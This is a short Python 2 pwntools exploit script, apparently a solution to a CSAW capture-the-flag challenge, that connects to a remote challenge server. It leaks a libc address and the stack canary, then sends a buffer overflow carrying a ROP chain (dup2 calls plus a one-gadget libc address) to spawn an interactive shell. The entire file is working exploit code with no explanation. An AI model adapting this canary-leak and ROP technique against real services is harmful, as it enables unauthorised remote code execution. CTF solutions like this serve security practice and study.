from pwn import *


#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("libc-2.19.so")

puts = libc.symbols['puts']
print hex(puts)

#bespokes = [0xF07F0, 0x0F16BD, 0x0442AA]
bespokes = [0xE5765, 0xE66BD,0x4647C]

#s = remote("localhost", 8888)
s = remote("pwn.chal.csaw.io", 8002)

#get ptr
s.sendline("1")
s.recvuntil("Reference:")
ptr = int(s.recvline()[:-1],16)

print hex(ptr)
libcbase = ptr+1280-puts

#get cookie
s.sendline("2")
s.sendline("")
s.recvuntil("...\n>")
buf = s.recvuntil("-Tut")

buf = buf[312:]

cookie = buf[:8]
print repr(cookie)
ret = u64(buf[8:16])
print hex(ret)

s.sendline("2")

bespoke = bespokes[1] +libcbase

#retonly = libcbase+0xCB000
poprsi = libcbase+0x0000000000024885

dup2 = libcbase+libc.symbols['dup2']

print hex(libcbase+bespoke)

buf = "A"*312+cookie+"Q"*8+ p64(poprsi)+p64(0)+p64(dup2)+p64(poprsi)+p64(1)+p64(dup2)+p64(bespoke)
s.sendline(buf)

s.interactive()
